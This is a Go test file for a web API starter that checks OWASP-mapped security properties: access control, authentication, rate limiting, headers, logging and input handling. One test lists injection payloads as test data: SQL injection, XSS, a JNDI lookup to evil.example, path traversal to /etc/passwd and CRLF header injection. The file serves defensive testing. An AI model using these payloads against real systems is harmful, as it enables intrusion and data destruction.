package app_test

import (
	"fmt"
	"net/http"
	"strings"
	"testing"
	"time"

	"github.com/google/go-cmp/cmp"
)

// These tests are the security contract of the starter. Each one is named for
// the property it protects (OWASP ASVS / Top 10 2025 area in brackets).

func TestOtherUsersItemsAreInvisible(t *testing.T) { // [A01 Broken Access Control]
	t.Parallel()
	ta := newTestApp(t, nil)
	alice, bob := ta.signUp("alice@example.com"), ta.signUp("bob@example.com")
	secret := ta.createItem(alice, "alice-secret")

	for _, tt := range []struct {
		method string
		body   any
	}{
		{"GET", nil},
		{"PUT", map[string]any{"name": "hijacked"}},
		{"DELETE", nil},
	} {
		r := ta.do(request{method: tt.method, path: "/v1/items/" + secret.ID, token: bob, body: tt.body})
		if r.Code != 404 {
			t.Errorf("%s another user's item: %d, want 404 (not 403: existence must not leak)", tt.method, r.Code)
		}
	}
	if r := ta.get("/v1/items", bob); !strings.Contains(string(r.Body), `"items":[]`) {
		t.Fatalf("bob's list shows foreign items: %s", r.Body)
	}
	still := ta.get("/v1/items/"+secret.ID, alice)
	var it itemJSON
	still.json(t, &it)
	if still.Code != 200 || it.Name != "alice-secret" {
		t.Fatalf("alice's item was modified by bob: %d %s", still.Code, still.Body)
	}
}

func TestMissingItemAndForeignItemAreIndistinguishable(t *testing.T) { // [A01]
	t.Parallel()
	ta := newTestApp(t, nil)
	alice, bob := ta.signUp("alice@example.com"), ta.signUp("bob@example.com")
	theirs := ta.createItem(alice, "x")
	foreign := ta.get("/v1/items/"+theirs.ID, bob)
	missing := ta.get("/v1/items/0199a8c4-3f6e-7b21-8c3d-0123456789ab", bob)
	a, b := foreign.problem(t), missing.problem(t)
	a.RequestID, b.RequestID, a.Instance, b.Instance = "", "", "", ""
	if diff := cmp.Diff(a, b); diff != "" || foreign.Code != missing.Code {
		t.Fatalf("a foreign id and a missing id answer differently (-foreign +missing):\n%s", diff)
	}
}

func TestEveryProtectedRouteRequiresAuthentication(t *testing.T) { // [A01, A07]
	t.Parallel()
	ta := newTestApp(t, nil)
	id := "0199a8c4-3f6e-7b21-8c3d-0123456789ab"
	for _, route := range []struct{ method, path string }{
		{"POST", "/v1/auth/logout"},
		{"GET", "/v1/auth/me"},
		{"GET", "/v1/items"},
		{"POST", "/v1/items"},
		{"GET", "/v1/items/" + id},
		{"PUT", "/v1/items/" + id},
		{"DELETE", "/v1/items/" + id},
	} {
		for name, token := range map[string]string{"no token": "", "garbage": "garbage", "wrong shape": strings.Repeat("A", 300)} {
			r := ta.do(request{method: route.method, path: route.path, token: token, body: map[string]any{"name": "x"}})
			if r.Code != 401 {
				t.Errorf("%s %s with %s: %d, want 401", route.method, route.path, name, r.Code)
				continue
			}
			if r.problem(t).Type != "urn:problem:unauthenticated" || !strings.HasPrefix(r.Header.Get("WWW-Authenticate"), "Bearer") {
				t.Errorf("%s %s: 401 without the problem body or WWW-Authenticate header", route.method, route.path)
			}
		}
	}
}

func TestExpiredAndRevokedTokensAreRefused(t *testing.T) { // [A07 Authentication Failures]
	t.Parallel()
	ta := newTestApp(t, nil)
	tok := ta.signUp("ada@example.com")
	if r := ta.get("/v1/items", tok); r.Code != 200 {
		t.Fatalf("fresh token: %d", r.Code)
	}
	ta.clock.Advance(time.Hour + time.Second)
	if r := ta.get("/v1/items", tok); r.Code != 401 {
		t.Fatalf("expired token: %d", r.Code)
	}
}

func TestInjectionStringsAreInertData(t *testing.T) { // [A05 Injection]
	t.Parallel()
	ta := newTestApp(t, nil)
	tok := ta.signUp("ada@example.com")
	payloads := []string{
		`'; DROP TABLE items; --`,
		`" OR "1"="1`,
		`<script>alert(1)</script>`,
		"${jndi:ldap://evil.example/a}",
		`{{7*7}}`,
		"../../../etc/passwd",
		"line1\r\nX-Injected: yes",
	}
	for _, p := range payloads {
		it := ta.createItem(tok, p)
		got := ta.get("/v1/items/"+it.ID, tok)
		var back itemJSON
		got.json(t, &back)
		if got.Code != 200 || back.Name != strings.TrimSpace(p) {
			t.Errorf("payload %q was altered or refused: %d %q", p, got.Code, back.Name)
		}
		if got.Header.Get("X-Injected") != "" {
			t.Errorf("payload %q injected a response header", p)
		}
	}
	// The same strings as path ids and cursors are simply "not found" / "invalid".
	for _, p := range []string{"%27%20OR%201=1%20--", "1;DROP%20TABLE%20items", "..%2f..%2fetc%2fpasswd", "%00"} {
		if r := ta.get("/v1/items/"+p, tok); r.Code != 404 {
			t.Errorf("GET /v1/items/%s -> %d, want 404", p, r.Code)
		}
	}
	if r := ta.get("/v1/items?cursor="+"'%20OR%201=1", tok); r.Code != 422 {
		t.Errorf("injection in cursor: %d", r.Code)
	}
	// Login with SQL in the email must be an ordinary failed login.
	r := ta.do(request{method: "POST", path: "/v1/auth/login", body: map[string]string{"email": "' OR '1'='1' --@example.com", "password": testPassword}})
	if r.Code != 401 {
		t.Errorf("SQL in login email: %d", r.Code)
	}
	if n := strings.Count(string(ta.get("/v1/items?limit=100", tok).Body), `"id"`); n != len(payloads) {
		t.Errorf("table content changed: %d items, want %d", n, len(payloads))
	}
}

func TestMassAssignmentIsImpossible(t *testing.T) { // [A01, A06 Insecure Design]
	t.Parallel()
	ta := newTestApp(t, nil)
	alice, bob := ta.signUp("alice@example.com"), ta.signUp("bob@example.com")
	var aliceID struct{ ID string }
	ta.get("/v1/auth/me", alice).json(t, &aliceID)

	forged := "11111111-1111-7111-8111-111111111111"
	r := ta.do(request{method: "POST", path: "/v1/items", token: bob, body: map[string]any{
		"name": "mine", "id": forged, "owner_id": aliceID.ID, "created_at": "2001-01-01T00:00:00Z", "updated_at": "2001-01-01T00:00:00Z",
	}})
	var it itemJSON
	r.json(t, &it)
	if r.Code != 201 || it.ID == forged || it.CreatedAt.Year() == 2001 {
		t.Fatalf("client-supplied server fields were honoured: %d %s", r.Code, r.Body)
	}
	if ta.get("/v1/items/"+it.ID, alice).Code != 404 {
		t.Fatal("bob created an item owned by alice through owner_id")
	}
	if ta.get("/v1/items/"+it.ID, bob).Code != 200 {
		t.Fatal("bob's item is not bob's")
	}
}

func TestBodyLimitsAndMediaTypes(t *testing.T) { // [A02, A10 Mishandling of Exceptional Conditions]
	t.Parallel()
	ta := newTestApp(t, nil)
	tok := ta.signUp("ada@example.com")
	post := func(body any, hdr map[string]string) response {
		return ta.do(request{method: "POST", path: "/v1/items", token: tok, body: body, header: hdr})
	}

	big := fmt.Sprintf(`{"name":"x","description":%q}`, strings.Repeat("a", 5000))
	if r := post(big, nil); r.Code != 413 || r.problem(t).Type != "urn:problem:payload-too-large" {
		t.Errorf("oversized body: %d %s", r.Code, r.Body)
	}
	if r := post(big, map[string]string{"Content-Length": ""}); r.Code != 413 {
		t.Errorf("oversized body without a declared length: %d", r.Code)
	}
	for _, ct := range []string{"text/plain", "application/xml", "multipart/form-data", "application/x-www-form-urlencoded"} {
		r := post(`{"name":"x"}`, map[string]string{"Content-Type": ct})
		if r.Code != 415 || r.problem(t).Type != "urn:problem:unsupported-media-type" {
			t.Errorf("Content-Type %s: %d %s", ct, r.Code, r.Body)
		}
	}
	for _, bad := range []string{"", "{", `{"name":`, "[]", `"just a string"`, "null", `{"name": 5}`, `{"name":"x","quantity":"many"}`, `{"name":["x"]}`} {
		r := post(bad, nil)
		if r.Code != 400 && r.Code != 422 {
			t.Errorf("body %q: %d, want 400 or 422", bad, r.Code)
			continue
		}
		r.problem(t)
	}
}

func TestErrorsNeverLeakInternals(t *testing.T) { // [A02, A09, A10]
	t.Parallel()
	ta := newTestApp(t, nil)
	tok := ta.signUp("ada@example.com")
	for _, r := range []response{
		ta.get("/nope", ""), ta.get("/v1/items/zzz", tok), ta.get("/v1/items?limit=x", tok), ta.get("/v1/items", ""),
		ta.do(request{method: "POST", path: "/v1/items", token: tok, body: "{"}),
	} {
		body := string(r.Body)
		for _, leak := range []string{"goroutine", "panic", ".go:", "runtime error", "pgx", "SELECT", "postgres://"} {
			if strings.Contains(body, leak) {
				t.Errorf("response %d leaks %q: %s", r.Code, leak, body)
			}
		}
	}
}

func TestSecurityHeadersOnEveryResponse(t *testing.T) { // [A02 Security Misconfiguration]
	t.Parallel()
	ta := newTestApp(t, map[string]string{"APP_ENV": "production"})
	tok := ta.signUp("ada@example.com")
	for _, r := range []response{
		ta.get("/healthz", ""), ta.get("/nope", ""), ta.get("/v1/items", tok), ta.get("/v1/items", ""),
		ta.do(request{method: "POST", path: "/v1/auth/login", body: "{"}), ta.get("/openapi.yaml", ""),
	} {
		for h, want := range map[string]string{
			"X-Content-Type-Options":    "nosniff",
			"X-Frame-Options":           "DENY",
			"Referrer-Policy":           "no-referrer",
			"Cache-Control":             "no-store",
			"Strict-Transport-Security": "max-age=63072000; includeSubDomains",
		} {
			if got := r.Header.Get(h); got != want {
				t.Errorf("HTTP %d: %s = %q, want %q", r.Code, h, got, want)
			}
		}
		if r.Header.Get("X-Request-Id") == "" || r.Header.Get("Server") != "" || r.Header.Get("X-Powered-By") != "" {
			t.Errorf("HTTP %d: request id missing or a fingerprinting header present: %v", r.Code, r.Header)
		}
	}
}

func TestRequestIDPropagation(t *testing.T) { // [A09 Logging and Alerting Failures]
	t.Parallel()
	ta := newTestApp(t, nil)
	r := ta.do(request{method: "GET", path: "/nope", header: map[string]string{"X-Request-Id": "client-supplied-42"}})
	if r.Header.Get("X-Request-Id") != "client-supplied-42" || r.problem(t).RequestID != "client-supplied-42" {
		t.Fatalf("the inbound request id was not propagated: %v %s", r.Header, r.Body)
	}
	if !strings.Contains(ta.logs.String(), `"request_id":"client-supplied-42"`) {
		t.Fatalf("the access log does not carry the request id: %s", ta.logs)
	}
}

func TestSecretsNeverReachTheLogs(t *testing.T) { // [A09, A04 Cryptographic Failures]
	t.Parallel()
	ta := newTestApp(t, nil)
	tok := ta.signUp("ada@example.com")
	ta.createItem(tok, "thing")
	ta.get("/v1/items?token="+tok, tok) // a token in the query string must not be logged either
	ta.do(request{method: "POST", path: "/v1/auth/login", body: map[string]string{"email": "ada@example.com", "password": "wrong-password-value"}})

	logs := ta.logs.String()
	if logs == "" {
		t.Fatal("no access log was written")
	}
	for name, secret := range map[string]string{"bearer token": tok, "password": testPassword, "wrong password": "wrong-password-value"} {
		if strings.Contains(logs, secret) {
			t.Errorf("the %s is in the logs", name)
		}
	}
}

func TestPasswordsAreStoredHashedAndTokensAreHashed(t *testing.T) { // [A04]
	t.Parallel()
	ta := newTestApp(t, nil)
	ta.signUp("ada@example.com")
	// The register response and the log are covered above; the stored form is
	// covered by the auth package tests (argon2id PHC string, SHA-256 token hash).
	r := ta.do(request{method: "POST", path: "/v1/auth/register", body: map[string]string{"email": "bob@example.com", "password": testPassword}})
	if strings.Contains(string(r.Body), "$argon2") || strings.Contains(string(r.Body), testPassword) {
		t.Fatalf("hash or password echoed: %s", r.Body)
	}
}

func TestLoginAndRegisterAreRateLimited(t *testing.T) { // [A07]
	t.Parallel()
	ta := newTestApp(t, map[string]string{"AUTH_RATE_LIMIT_PER_MINUTE": "6", "AUTH_RATE_LIMIT_BURST": "3"})
	attempt := func(ip string) response {
		return ta.do(request{method: "POST", path: "/v1/auth/login", remote: ip + ":4000", body: map[string]string{"email": "ada@example.com", "password": "wrong-password-value"}})
	}
	for i := range 3 {
		if r := attempt("203.0.113.5"); r.Code != 401 {
			t.Fatalf("attempt %d: %d, want 401", i, r.Code)
		}
	}
	r := attempt("203.0.113.5")
	if p := r.problem(t); r.Code != 429 || p.Type != "urn:problem:rate-limited" || r.Header.Get("Retry-After") == "" {
		t.Fatalf("brute force was not throttled: %d %+v", r.Code, p)
	}
	if attempt("198.51.100.7").Code != 401 {
		t.Fatal("another client must not share the budget")
	}
	if r := ta.do(request{method: "POST", path: "/v1/auth/register", remote: "203.0.113.5:4000", body: map[string]string{"email": "x@example.com", "password": testPassword}}); r.Code != 429 {
		t.Fatalf("registration shares the auth limiter: %d", r.Code)
	}
	// Spoofing X-Forwarded-For must not buy a fresh budget.
	spoof := ta.do(request{method: "POST", path: "/v1/auth/login", remote: "203.0.113.5:4000", header: map[string]string{"X-Forwarded-For": "10.9.8.7"}, body: map[string]string{"email": "a@example.com", "password": "wrong-password-value"}})
	if spoof.Code != 429 {
		t.Fatalf("X-Forwarded-For bypassed the rate limit: %d", spoof.Code)
	}
}

func TestGeneralRateLimitSparesProbes(t *testing.T) {
	t.Parallel()
	ta := newTestApp(t, map[string]string{"RATE_LIMIT_RPS": "0.1", "RATE_LIMIT_BURST": "2"})
	codes := []int{ta.get("/openapi.yaml", "").Code, ta.get("/openapi.yaml", "").Code, ta.get("/openapi.yaml", "").Code}
	if codes[0] != 200 || codes[1] != 200 || codes[2] != 429 {
		t.Fatalf("codes = %v", codes)
	}
	for range 20 {
		if ta.get("/healthz", "").Code != 200 || ta.get("/readyz", "").Code != 200 {
			t.Fatal("probes must be exempt from the limit")
		}
	}
}

func TestCORSAllowList(t *testing.T) { // [A02]
	t.Parallel()
	ta := newTestApp(t, map[string]string{"CORS_ALLOWED_ORIGINS": "https://app.example.com"})
	pre := ta.do(request{method: "OPTIONS", path: "/v1/items", header: map[string]string{
		"Origin": "https://app.example.com", "Access-Control-Request-Method": "POST", "Access-Control-Request-Headers": "authorization",
	}})
	if pre.Code != http.StatusNoContent || pre.Header.Get("Access-Control-Allow-Origin") != "https://app.example.com" {
		t.Fatalf("allowed preflight: %d %v", pre.Code, pre.Header)
	}
	evil := ta.do(request{method: "GET", path: "/healthz", header: map[string]string{"Origin": "https://evil.example.net"}})
	if evil.Header.Get("Access-Control-Allow-Origin") != "" {
		t.Fatalf("a foreign origin was allowed: %v", evil.Header)
	}
	if ta.get("/healthz", "").Header.Get("Access-Control-Allow-Origin") != "" {
		t.Fatal("CORS headers on a same-origin request")
	}
}

func TestServiceSurvivesAStormOfMalformedRequests(t *testing.T) { // [A10]
	t.Parallel()
	ta := newTestApp(t, nil)
	for range 50 {
		ta.do(request{method: "POST", path: "/v1/items", token: "x", body: "\x00\xff\xfe"})
		ta.do(request{method: "POST", path: "/v1/auth/login", body: "\x00\xff\xfe"})
	}
	if r := ta.get("/healthz", ""); r.Code != 200 {
		t.Fatalf("service degraded after malformed requests: %d", r.Code)
	}
}
